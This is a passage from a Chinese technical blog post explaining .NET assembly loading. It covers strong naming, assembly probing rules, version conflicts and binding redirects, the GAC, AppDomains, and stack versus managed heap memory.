<p>&emsp;&emsp;现在，我们可以通过<code>ILDASM</code>工具(一款查看程序集IL代码的软件，在Microsoft SDKs目录中的子目录中)来查看该程序集的元数据表和Main方法中间码。<br><img src="1026815-20180626194204408-1416829392.png" alt=" "><br>&emsp;&emsp;c#源码第一行代码：<code>string rootDirectory = Environment.CurrentDirectory</code>;被翻译成IL代码： <code>call string [mscorlib/*23000001*/]System.Environment/*01000004*/::get_CurrentDirectory() /* 0A000003 */</code><br>&emsp;&emsp;这句话意思是调用 <code>System.Environment</code>类的<code>get_CurrentDirectory()</code>方法(属性会被编译为一个私有字段+对应get/set方法)。<br>&emsp;&emsp;点击视图=&gt;元信息=&gt;显示，即可查看该程序集的元数据。<br>&emsp;&emsp;我们可以看到<code>System.Environment</code>标记值为01000004，在<code>TypeRef</code>类型引用表中找到该项:<br><img src="1026815-20180626194233787-1487817175.png" alt=" "><br>&emsp;&emsp;注意图，<code>TypeRefName</code>下面有该类型中被引用的成员，其标记值为0A000003，也就是<code>get_CurrentDirectory</code>了。<br>&emsp;&emsp;而从其<code>ResolutionScope</code>指向位于0x23000001而得之，该类型存在于mscorlib程序集。<br><img src="1026815-20180626194312588-1104904496.png" alt=" "><br>&emsp;&emsp;于是我们打开mscorlib.dll的元数据清单，可以在类型定义表(TypeDef)找到<code>System.Environment</code>,可以从元数据得知该类型的一些标志(Flags,常见的public、sealed、class、abstract)，也得知继承(Extends)于<code>System.Object</code>。在该类型定义下还有类型的相关信息，我们可以在其中找到<code>get_CurrentDirectory</code>方法。 我们可以得到该方法的相关信息，这其中表明了该方法位于0x0002b784这个相对虚地址(RVA)，接着JIT在新地址处理CIL，周而复始。<br>&emsp;&emsp;元数据在运行时的作用： <a href="https://docs.microsoft.com/zh-cn/dotnet/standard/metadata-and-self-describing-components#run-time-use-of-metadata" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/standard/metadata-and-self-describing-components#run-time-use-of-metadata</a>  </p>
<h1 id="程序集的规则"><a href="#程序集的规则" class="headerlink" title="程序集的规则"></a>程序集的规则</h1><p>&emsp;&emsp;上文我通过ILDASM来描述CLR执行代码的方式，但还不够具体，还需要补充的是对于程序集的搜索方式。<br>&emsp;&emsp;对于System.Environment类型，它存在于mscorlib.dll程序集中，demo.exe是个独立的个体，它通过csc编译的时候只是注册了引用mscorlib.dll中的类型的引用信息，并没有记录mscorlib.dll在磁盘上的位置，那么，CLR怎么知道get_CurrentDirectory的代码？它是从何处读取mscorlib.dll的？<br>&emsp;&emsp;对于这个问题，.NET有个专门的概念定义，我们称为 程序集的加载方式。  </p>
<h2 id="程序集的加载方式"><a href="#程序集的加载方式" class="headerlink" title="程序集的加载方式"></a>程序集的加载方式</h2><p>&emsp;&emsp;对于自身程序集内定义的类型，我们可以直接从自身程序集中的元数据中获取，对于在其它程序集中定义的类型，CLR会通过一组规则来在磁盘中找到该程序集并加载在内存。<br>&emsp;&emsp;CLR在查找引用的程序集的位置时候，第一个判断条件是 判断该程序集是否被签名。<br>&emsp;&emsp;什么是签名？  </p>
<h2 id="强名称程序集"><a href="#强名称程序集" class="headerlink" title="强名称程序集"></a>强名称程序集</h2><p>&emsp;&emsp;就比如大家都叫张三，姓名都一样，喊一声张三不知道到底在叫谁。这时候我们就必须扩展一下这个名字以让它具有唯一性。<br>&emsp;&emsp;我们可以通过<code>sn.exe</code>或<code>VS</code>对项目右键属性在签名选项卡中采取RSA算法对程序集进行数字签名（加密：公钥加密，私钥解密。签名：私钥签名，公钥验证签名），会将构成程序集的所有文件通过哈希算法生成哈希值，然后通过非对称加密算法用私钥签名，最后公布公钥生成一串token，最终将生成一个由程序集名称、版本号、语言文化、公钥组成的唯一标识，它相当于一个强化的名称，即强名称程序集。<br>&emsp;&emsp;<code>mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</code><br>&emsp;&emsp;我们日常在VS中的项目默认都没有被签名，所以就是弱名称程序集。强名称程序集是具有唯一标识性的程序集，并且可以通过对比哈希值来比较程序集是否被篡改，不过仍然有很多手段和软件可以去掉程序集的签名。<br>&emsp;&emsp;需要值得注意的一点是：当你试图在已生成好的强名称程序集中引用弱名称程序集，那么你必须对弱名称程序集进行签名并在强名称程序集中重新注册。<br>&emsp;&emsp;之所以这样是因为一个程序集是否被篡改还要考虑到该程序集所引用的那些程序集，根据CLR搜索程序集的规则(下文会介绍)，没有被签名的程序集可以被随意替换，所以考虑到安全性，强名称程序集必须引用强名称程序集，否则就会报错：需要强名称程序集。<br>&emsp;&emsp;.NET Framework 4.5中对强签名的更改：<a href="https://docs.microsoft.com/zh-cn/dotnet/framework/app-domains/enhanced-strong-naming" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/framework/app-domains/enhanced-strong-naming</a>  </p>
<h2 id="程序集搜索规则"><a href="#程序集搜索规则" class="headerlink" title="程序集搜索规则"></a>程序集搜索规则</h2><p>&emsp;&emsp;事实上，按照存储位置来说，程序集分为共享(全局)程序集和私有程序集。<br>&emsp;&emsp;CLR查找程序集的时候，会先判断该程序集是否被强签名，如果强签名了那么就会去共享程序集的存储位置(后文的GAC)去找，如果没找到或者该程序集没有被强签名，那么就从该程序集的同一目录下去寻找。<br>&emsp;&emsp;强名称程序集是先找到与程序集名称(VS中对项目右键属性应用程序-&gt;程序集名称)相等的文件名称，然后 按照唯一标识再来确认，确认后CLR加载程序集，同时会通过公钥效验该签名来验证程序集是否被篡改(如果想跳过验证可查阅<a href="https://docs.microsoft.com/zh-cn/dotnet/framework/app-domains/how-to-disable-the-strong-name-bypass-feature)，如果强名称程序集被篡改则报错。" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/framework/app-domains/how-to-disable-the-strong-name-bypass-feature)，如果强名称程序集被篡改则报错。</a><br>&emsp;&emsp;而弱名称程序集则直接按照与程序集名称相等的文件名称来找，如果还是没有找到就以该程序集名称为目录的文件夹下去找。总之，如果最终结果就是没找到那就会报<code>System.IO.FileNotFoundException</code>异常，即尝试访问磁盘上不存在的文件失败时引发的异常。<br>&emsp;&emsp;注意：此处文件名称和程序集名称是两个概念，不要模棱两可，文件CLR头内嵌程序集名称。<br>&emsp;&emsp;举个例子：<br>&emsp;&emsp;我有一个控制台程序，其路径为D:\Demo\Debug\demo.exe，通过该程序的元数据得知，其引用了一个程序集名称为aa的普通程序集，引用了一个名为bb的强名称程序集，该bb.dll的强名称标识为：xx001。<br>&emsp;&emsp;现在CLR开始搜索程序集aa，首先它会从demo.exe控制台的同一目录（也就是D:\Demo\Debug\）中查找程序集aa，搜索文件名为aa.dll的文件，如果没找到就在该目录下以程序集名称为目录的目录中查找，也就是会查 D:\Demo\Debug\aa\aa.dll，这也找不到那就报错。<br>&emsp;&emsp;然后CLR开始搜索程序集bb，CLR从demo.exe的元数据中发现bb是强名称程序集，其标识为:xx001。于是CLR会先从一个被定义为GAC的目录中去通过标识找，没找到的话剩下的寻找步骤就和寻找aa一样完全一致了。<br>&emsp;&emsp;当然，你也可以通过配置文件config中(配置文件存在于应用程序的同一目录中)人为增加程序集搜索规则：<br>&emsp;&emsp;1.在运行时<code>runtime</code>节点中，添加<code>privatePath</code>属性来添加搜索目录，不过只能填写相对路径：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;runtime&gt;</span><br><span class="line">            &lt;assemblyBinding xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot;&gt;</span><br><span class="line">                &lt;probing privatePath=&quot;relative1;relative2;&quot; /&gt; //程序集当前目录下的相对路径目录，用;号分割</span><br><span class="line">            &lt;/assemblyBinding&gt;</span><br><span class="line">&lt;/runtime&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;2.如果程序集是强签名后的，那么可以通过<code>codeBase</code>来指定网络路径或本地绝对路径。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;runtime&gt;</span><br><span class="line">            &lt;assemblyBinding xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot;&gt;</span><br><span class="line">                &lt;dependentAssembly&gt;</span><br><span class="line">                    &lt;assemblyIdentity name=&quot;myAssembly&quot;</span><br><span class="line">                                      publicKeyToken=&quot;32ab4ba45e0a69a1&quot;</span><br><span class="line">                                      culture=&quot;neutral&quot; /&gt;</span><br><span class="line">                    &lt;codeBase version=&quot;2.0.0.0&quot;</span><br><span class="line">                              href=&quot;http://www.litwareinc.com/myAssembly.dll&quot; /&gt;</span><br><span class="line">                &lt;/dependentAssembly&gt;</span><br><span class="line">            &lt;/assemblyBinding&gt;</span><br><span class="line">&lt;/runtime&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;当然，我们还可以在代码中通过<code>AppDomain</code>类中的几个成员来改变搜索规则，如<code>AssemblyResolve</code>事件、<code>AppDomainSetup</code>类等。<br>&emsp;&emsp;有关运行时节点的描述:<a href="https://docs.microsoft.com/zh-cn/dotnet/framework/configure-apps/file-schema/runtime/runtime-element" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/framework/configure-apps/file-schema/runtime/runtime-element</a>  </p>
<h2 id="项目的依赖顺序"><a href="#项目的依赖顺序" class="headerlink" title="项目的依赖顺序"></a>项目的依赖顺序</h2><p>&emsp;&emsp;如果没有通过config或者在代码中来设定CLR搜索程序集的规则，那么CLR就按照默认的也就是我上述所说的模式来寻找。<br>&emsp;&emsp;所以如果我们通过csc.exe来编译项目，引用了其它程序集的话，通常需要将那些程序集复制到同一目录下。故而每当我们通过VS编译器对项目右键重新生成项目(重新编译)时，VS都会将引用的程序集给复制一份到项目bin\输出目录Debug文件夹下，我们可以通过VS中对引用的程序集右键属性-复制本地 True/Flase 来决定这一默认行为。<br>&emsp;&emsp;值得一提的是，项目间的生成是有序生成的，它取决于项目间的依赖顺序。<br>&emsp;&emsp;比如Web项目引用BLL项目，BLL项目引用了DAL项目。那么当我生成Web项目的时候，因为我要注册Bll程序集，所以我要先生成Bll程序集，而BLL程序集又引用了Dal，所以又要先生成Dal程序集，所以程序集生成顺序就是Dal=&gt;BLL=&gt;Web，项目越多编译的时间就越久。<br>&emsp;&emsp;程序集之间的依赖顺序决定了编译顺序，所以在设计项目间的分层划分时不仅要体现出层级职责，还要考虑到依赖顺序。代码存放在哪个项目要有讲究，不允许出现互相引用的情况，比如A项目中的代码引用B，B项目中的代码又引用A。  </p>
<h2 id="为什么Newtonsoft-Json版本不一致？"><a href="#为什么Newtonsoft-Json版本不一致？" class="headerlink" title="为什么Newtonsoft.Json版本不一致？"></a>为什么Newtonsoft.Json版本不一致？</h2><p>&emsp;&emsp;而除了注意编译顺序外，我们还要注意程序集间的版本问题，版本间的错乱会导致程序的异常。<br>&emsp;&emsp;举个经典的例子：Newtonsoft.Json的版本警告，大多数人都知道通过版本重定向来解决这个问题，但很少有人会琢磨为什么会出现这个问题，找了一圈文章，没找到一个解释的。<br>&emsp;&emsp;比如：<br>&emsp;&emsp;A程序集引用了 C盘:\Newtonsoft.Json 6.0程序集<br>&emsp;&emsp;B程序集引用了 从Nuget下载下来的Newtonsoft.Json 10.0程序集<br>&emsp;&emsp;此时A引用B，就会报：发现同一依赖程序集的不同版本间存在无法解决的冲突 这一警告。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">A：引用Newtonsoft.Json 6.0</span><br><span class="line">       Func()</span><br><span class="line">       &#123;</span><br><span class="line">           var obj= Newtonsoft.Json.Obj;</span><br><span class="line">           B.JsonObj();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">B: 引用Newtonsoft.Json 10.0</span><br><span class="line">       JsonObj()</span><br><span class="line">       &#123;</span><br><span class="line">           return  Newtonsoft.Json.Obj;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;A程序集中的Func方法调用了B程序集中的JsonObj方法，JsonObj方法又调用了Newtonsoft.Json 10.0程序集中的对象，那么当执行Func方法时程序就会异常，报<code>System.IO.FileNotFoundException</code>: 未能加载文件或程序集Newtonsoft.Json 10.0的错误。  </p>
<p>&emsp;&emsp;这是为什么？  </p>
<ol>
<li>这是因为依赖顺序引起的。A引用了B，首先会先生成B，而B引用了 Newtonsoft.Json 10.0，那么VS就会将源引用文件(Newtonsoft.Json 10.0)复制到B程序集同一目录(bin/Debug)下，名为Newtonsoft.Json.dll文件，其内嵌程序集版本为10.0。  </li>
<li>然后A引用了B，所以会将B程序集和B程序集的依赖项(Newtonsoft.Json.dll)给复制到A的程序集目录下，而A又引用了C盘的Newtonsoft.Json 6.0程序集文件，所以又将C:\Newtonsoft.Json.dll文件给复制到自己程序集目录下。因为两个Newtonsoft.Json.dll重名，所以直接覆盖了前者，那么只保留了Newtonsoft.Json 6.0。  </li>
<li>当我们调用Func方法中的B.Convert()时候，CLR会搜索B程序集，找到后再调用 return Newtonsoft.Json.Obj 这行代码，而这行代码又用到了Newtonsoft.Json程序集，接下来CLR搜索Newtonsoft.Json.dll，文件名称满足，接下来CLR判断其标识，发现版本号是6.0，与B程序集清单里注册的10.0版本不符，故而才会报出异常：未能加载文件或程序集Newtonsoft.Json 10.0。  </li>
</ol>
<p>&emsp;&emsp;以上就是为何Newtonsoft.Json版本不一致会导致错误的原因，其也诠释了CLR搜索程序集的一个过程。<br>&emsp;&emsp;那么，如果我执意如此，有什么好的解决方法能让程序顺利执行呢？有，有2个方法。<br>&emsp;&emsp;第一种：通过<code>bindingRedirect</code>节点重定向，即当找到10.0的版本时，给定向到6.0版本  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;runtime&gt;</span><br><span class="line">            &lt;assemblyBinding xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot;&gt;</span><br><span class="line">                &lt;dependentAssembly&gt;</span><br><span class="line">                    &lt;assemblyIdentity name=&quot;Newtonsoft.Json&quot;</span><br><span class="line">                                      publicKeyToken=&quot;30ad4fe6b2a6aeed&quot;</span><br><span class="line">                                      culture=&quot;neutral&quot; /&gt;</span><br><span class="line">                    &lt;bindingRedirect oldVersion=&quot;10.0.0.0&quot;</span><br><span class="line">                                     newVersion=&quot;6.0.0.0&quot; /&gt;</span><br><span class="line">                &lt;/dependentAssembly&gt;</span><br><span class="line">            &lt;/assemblyBinding&gt;</span><br><span class="line">&lt;/runtime&gt;</span><br></pre></td></tr></table></figure>

<h2 id="如何在编译时加载两个相同的程序集？"><a href="#如何在编译时加载两个相同的程序集？" class="headerlink" title="如何在编译时加载两个相同的程序集？"></a>如何在编译时加载两个相同的程序集？</h2><p>&emsp;&emsp;注意：我看过有的文章里写的一个AppDomain只能加载一个相同的程序集，很多人都以为不能同时加载2个不同版本的程序集，实际上CLR是可以同时加载Newtonsoft.Json 6.0和Newtonsoft.Json 10.0的。<br>&emsp;&emsp;第二种：对每个版本指定<code>codeBase</code>路径，然后分别放上不同版本的程序集，这样就可以加载两个相同的程序集。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;runtime&gt;</span><br><span class="line">        &lt;assemblyBinding xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot;&gt;</span><br><span class="line">            &lt;dependentAssembly&gt;</span><br><span class="line">                &lt;assemblyIdentity name=&quot;Newtonsoft.Json&quot;</span><br><span class="line">                                  publicKeyToken=&quot;30ad4fe6b2a6aeed&quot;</span><br><span class="line">                                  culture=&quot;neutral&quot; /&gt;</span><br><span class="line">                &lt;codeBase version=&quot;6.0.0.0&quot;</span><br><span class="line">                          href=&quot;D:\6.0\Newtonsoft.Json.dll&quot; /&gt;</span><br><span class="line">            &lt;/dependentAssembly&gt;</span><br><span class="line">            &lt;dependentAssembly&gt;</span><br><span class="line">                &lt;assemblyIdentity name=&quot;Newtonsoft.Json&quot;</span><br><span class="line">                                  publicKeyToken=&quot;30ad4fe6b2a6aeed&quot;</span><br><span class="line">                                  culture=&quot;neutral&quot; /&gt;</span><br><span class="line">                &lt;codeBase version=&quot;10.0.0.0&quot;</span><br><span class="line">                          href=&quot;D:\10.0\Newtonsoft.Json.dll&quot; /&gt;</span><br><span class="line">            &lt;/dependentAssembly&gt;</span><br><span class="line">        &lt;/assemblyBinding&gt;</span><br><span class="line">&lt;/runtime&gt;</span><br></pre></td></tr></table></figure>

<h2 id="如何同时调用两个相同命名空间和类型的程序集？"><a href="#如何同时调用两个相同命名空间和类型的程序集？" class="headerlink" title="如何同时调用两个相同命名空间和类型的程序集？"></a>如何同时调用两个相同命名空间和类型的程序集？</h2><p>&emsp;&emsp;除了程序集版本不同外，还有一种情况就是，我一个项目同时引用了程序集A和程序集B，但程序集A和程序集B中的命名空间和类型名称完全一模一样，这个时候我调用任意一个类型都无法区分它是来自于哪个程序集的，那么这种情况我们可以使用<code>extern alias</code>外部别名。<br>&emsp;&emsp;我们需要在所有代码前定义别名，extern alias a;extern alias b;，然后在VS中对引用的程序集右键属性-别名，分别将其更改为a和b(或在csc中通过<code>/r:{别名}={程序集}.dll</code>)。<br>&emsp;&emsp;在代码中通过 <code>{别名}::{命名空间}.{类型}</code>的方式来使用。<br>&emsp;&emsp;extern-alias介绍： <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/keywords/extern-alias" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/keywords/extern-alias</a>  </p>
<h2 id="共享程序集GAC"><a href="#共享程序集GAC" class="headerlink" title="共享程序集GAC"></a>共享程序集GAC</h2><p>&emsp;&emsp;我上面说了这么多有关CLR加载程序集的细节和规则，事实上，类似于mscorlib.dll、System.dll这样的FCL类库被引用的如此频繁，它已经是我们.NET编程中必不可少的一部分，几尽每个项目都会引用，为了不再每次使用的时候都复制一份，所以计算机上有一个位置专门存储这些我们都会用到的程序集，叫做全局程序集缓存(Global Assembly Cache,GAC)，这个位置一般位于C:\Windows\Microsoft.NET\assembly和3.5之前版本的C:\Windows\assembly。<br>&emsp;&emsp;既然是共享存放的位置，那不可避免的会遇到文件名重复的情况，那么为了杜绝该类情况，规定在GAC中只能存在强名称程序集，每当CLR要加载强名称程序集时，会先通过标识去GAC中查找，而考虑到程序集文件名称一致但版本文化等复杂的情况，所以GAC有自己的一套目录结构。我们如果想将自己的程序集放入GAC中，那么就必须先签名，然后通过如gacutil.exe工具(其存在于命令行工具中 <a href="https://docs.microsoft.com/zh-cn/dotnet/framework/tools/developer-command-prompt-for-vs中)来注册至GAC中，值得一提的是在将强名称程序集安装在GAC中，会效验签名。" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/framework/tools/developer-command-prompt-for-vs中)来注册至GAC中，值得一提的是在将强名称程序集安装在GAC中，会效验签名。</a><br>&emsp;&emsp;GAC工具： <a href="https://docs.microsoft.com/en-us/dotnet/framework/tools/gacutil-exe-gac-tool" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/dotnet/framework/tools/gacutil-exe-gac-tool</a>  </p>
<h2 id="延伸"><a href="#延伸" class="headerlink" title="延伸"></a>延伸</h2><p>&emsp;&emsp;CLR是按需加载程序集的，没有执行代码也就没有调用相应的指令，没有相应的指令，CLR也不会对其进行相应的操作。 当我们执行<code>Environment.CurrentDirectory</code>这段代码的时候，CLR首先要获取Environment类型信息，通过自身元数据得知其存在mscorlib.dll程序集中，所以CLR要加载该程序集，而mscorlib.dll又由于其地位特殊，早在CLR初始化的时候就已经被类型加载器自动加载至内存中，所以这行代码可以直接在内存中读取到类型的方法信息。<br>&emsp;&emsp;在这个章节，我虽然描述了CLR搜索程序集的规则，但事实上，加载程序集读取类型信息远远没有这么简单，这涉及到了属于.NET Framework独有的”应用程序域”概念和内存信息的查找。<br>&emsp;&emsp;简单延伸两个问题，mscorlib.dll被加载在哪里？内存堆中又是什么样的一个情况？  </p>
<h1 id="应用程序域"><a href="#应用程序域" class="headerlink" title="应用程序域"></a>应用程序域</h1><p>&emsp;&emsp;传统非托管程序是直接承载在Windows进程中，托管程序是承载在.NET虚拟机CLR上的，而在CLR中管控的这部分资源中，被分成了一个个逻辑上的分区，这个逻辑分区被称为应用程序域，是.NET Framework中定义的一个概念。<br>&emsp;&emsp;因为堆内存的构建和删除都通过GC去托管，降低了人为出错的几率，在此特性基础上.NET强调在一个进程中通过CLR强大的管理建立起对资源逻辑上的隔离区域，每个区域的应用程序互不影响，从而让托管代码程序的安全性和健壮性得到了提升。<br>&emsp;&emsp;熟悉程序集加载规则和<code>AppDomain</code>是在.NET技术下进行插件编程的前提。<code>AppDomain</code>这部分概念并不复杂。<br>&emsp;&emsp;当启动一个托管程序时，最先启动的是<code>CLR</code>，在这过程中会通过代码初始化三个逻辑区域，最先是<code>SystemDomain</code>系统程序域，然后是<code>SharedDoamin</code>共享域，最后是<code>{程序集名称}Domain</code>默认域。<br>&emsp;&emsp;系统程序域里维持着一些系统构建项，我们可以通过这些项来监控并管理其它应用程序域等。共享域存放着其它域都会访问到的一些信息，当共享域初始化完毕后，会自动加载mscorlib.dll程序集至该共享域。而默认域则用储存自身程序集的信息，我们的主程序集就会被加载至这个默认域中，执行程序入口方法，在没有特殊动作外所产生的一切耗费都发生在该域。<br>&emsp;&emsp;我们可以在代码中创建和卸载应用程序域，域与域之间有隔离性，挂掉A域不会影响到B域，并且对于每一个加载的程序集都要指定域的，没有在代码中指定域的话，默认都是加载至默认域中。<br>&emsp;&emsp;<code>AppDomain</code>可以想象成组的概念，<code>AppDomain</code>包含了我们加载的一组程序集。我们通过代码卸载<code>AppDomain</code>，即同时卸载了该<code>AppDomain</code>中所加载的所有程序集在内存中的相关区域。<br>&emsp;&emsp;<code>AppDomain</code>的初衷是边缘隔离，它可以让程序不重新启动而长时间运行，围绕着该概念建立的体系从而让我们能够使用.NET技术进行插件编程。<br>&emsp;&emsp;当我们想让程序在不关闭不重新部署的情况下添加一个新的功能或者改变某一块功能，我们可以这样做：将程序的主模块仍默认加载至默认域，再创建一个新的应用程序域，然后将需要更改或替换的模块的程序集加载至该域，每当更改和替换的时候直接卸载该域即可。 而因为域的隔离性，我在A域和B域加载同一个程序集，那么A域和B域就会各存在内存地址不同但数据相同的程序集数据。  </p>
<h2 id="跨边界访问"><a href="#跨边界访问" class="headerlink" title="跨边界访问"></a>跨边界访问</h2><p>&emsp;&emsp;事实上，在开发中我们还应该注意跨域访问对象的操作(即在A域中的程序集代码直接调用B域中的对象)是与平常编程中有所不同的，一个域中的应用程序不能直接访问另一个域中的代码和数据，对于这样的在进程内跨域访问操作分两类。<br>&emsp;&emsp;一是按引用封送，需要继承<code>System.MarshalByRefObject</code>，传递的是该对象的代理引用，与源域有相同的生命周期。<br>&emsp;&emsp;二是按值封送，需要被<code>[Serializable]</code>标记，是通过序列化传递的副本，副本与源域的对象无关。<br>&emsp;&emsp;无论哪种方式都涉及到两个域直接的封送、解封，所以跨域访问调用不适用于过高频率。<br>&emsp;&emsp;(比如，原来你是这样调用对象： <code>var user=new User();</code> 现在你要这样：<code>var user=(User){应用程序域对象实例}.CreateInstanceFromAndUnwrap(&quot;Model.dll&quot;,&quot;Model.User&quot;);</code> )<br>&emsp;&emsp;值得注意的是，应用程序域是对程序集的组的划分，它与进程中的线程是两个一横一竖，方向不一样的概念，不应该将这2个概念放在一起比较。我们可以通过<code>Thread.GetDomain</code>来查看执行线程所在的域。<br>&emsp;&emsp;应用程序域在类库中是<code>System.AppDomain</code>类,部分重要的成员有：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">获取当前 System.Threading.Thread 的当前应用程序域</span><br><span class="line">public static AppDomain CurrentDomain &#123; get; &#125;</span><br><span class="line">使用指定的名称新建应用程序域</span><br><span class="line">public static AppDomain CreateDomain(string friendlyName);</span><br><span class="line">卸载指定的应用程序域。</span><br><span class="line">public static void Unload(AppDomain domain);</span><br><span class="line">指示是否对当前进程启用应用程序域的 CPU 和内存监视，开启后可以根据相关属性进行监控</span><br><span class="line">public static bool MonitoringIsEnabled &#123; get; set; &#125;</span><br><span class="line">当前域托管代码抛出异常时最先发生的一个事件，框架设计中可以用到</span><br><span class="line">public event EventHandler&lt;FirstChanceExceptionEventArgs&gt; FirstChanceException;</span><br><span class="line">当某个异常未被捕获时调用该事件，如代码里只catch了a异常，实际产生的是 b异常，那么b异常就没有捕捉到。</span><br><span class="line">public event UnhandledExceptionEventHandler UnhandledException;</span><br><span class="line">为指定的应用程序域属性分配指定值。该应用程序域的局部存储值，该存储不划分上下文和线程，均可通过GetData获取。</span><br><span class="line">public void SetData(string name, object data);</span><br><span class="line">如果想使用托管代码来覆盖CLR的默认行为https://msdn.microsoft.com/zh-cn/library/system.appdomainmanager(v=vs.85).aspx</span><br><span class="line">public AppDomainManager DomainManager &#123; get; &#125;</span><br><span class="line">返回域的配置信息，如在config中配置的节点信息</span><br><span class="line">public AppDomainSetup SetupInformation &#123; get; &#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;应用程序域： <a href="https://docs.microsoft.com/zh-cn/dotnet/framework/app-domains/application-domains" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/framework/app-domains/application-domains</a>  </p>
<h2 id="AppDomain和AppPool"><a href="#AppDomain和AppPool" class="headerlink" title="AppDomain和AppPool"></a>AppDomain和AppPool</h2><p>&emsp;&emsp;注意：此处的<code>AppDomain</code>应用程序域 和 IIS中的<code>AppPool</code>应用程序池 是2个概念，AppPool是IIS独有的概念，它也相当于一个组的概念，对网站进行划组，然后对组进行一些如进程模型、CPU、内存、请求队列的高级配置。  </p>
<h1 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h1><p>&emsp;&emsp;应用程序域把资源给隔离开，这个资源，主要指内存。那么什么是内存呢？<br>&emsp;&emsp;要知道，程序运行的过程就是电脑不断通过CPU进行计算的过程，这个过程需要读取并产生运算的数据，为此我们需要一个拥有足够容量能够快速与CPU交互的存储容器，这就是内存了。对于内存大小，32位处理器，寻址空间最大为2的32次方byte，也就是4G内存，除去操作系统所占用的公有部分，进程大概能占用2G内存，而如果是64位处理器，则是8T。<br>&emsp;&emsp;而在.NET中，内存区域分为堆栈和托管堆。  </p>
<h2 id="堆栈和堆的区别"><a href="#堆栈和堆的区别" class="headerlink" title="堆栈和堆的区别"></a>堆栈和堆的区别</h2><p>&emsp;&emsp;堆和堆栈就内存而言只不过是地址范围的区别。不过堆栈的数据结构和其存储定义让其在时间和空间上都紧密的存储，这样能带来更高的内存密度，能在CPU缓存和分页系统表现的更好。故而访问堆栈的速度总体来说比访问堆要快点。  </p>
<h2 id="线程堆栈"><a href="#线程堆栈" class="headerlink" title="线程堆栈"></a>线程堆栈</h2><p>&emsp;&emsp;操作系统会为每条线程分配一定的空间，Windwos为1M，这称之为线程堆栈。在CLR中的栈主要用来执行线程方法时，保存临时的局部变量和函数所需的参数及返回的值等，在栈上的成员不受GC管理器的控制，它们由操作系统负责分配，当线程走出方法后，该栈上成员采用后进先出的顺序由操作系统负责释放，执行效率高。<br>&emsp;&emsp;而托管堆则没有固定容量限制，它取决于操作系统允许进程分配的内存大小和程序本身对内存的使用情况，托管堆主要用来存放对象实例，不需要我们人工去分配和释放，其由GC管理器托管。  </p>
